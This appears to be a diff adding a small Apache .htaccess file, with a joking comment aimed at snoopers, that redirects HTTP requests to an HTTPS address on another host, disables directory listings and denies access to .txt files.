@@ -1,0 +1,12 @@
+# snooping as usual i see
+
+RewriteEngine on
+RewriteCond %{HTTP_HOST} example\.com [NC]
+RewriteCond %{SERVER_PORT} 80
+RewriteRule ^(.*)$ https://cbf.rf.gd/$1 [R,L]
+Options -Indexes
+
+<Files "*.txt">
+   Order allow,deny
+   Deny from all
+</Files>
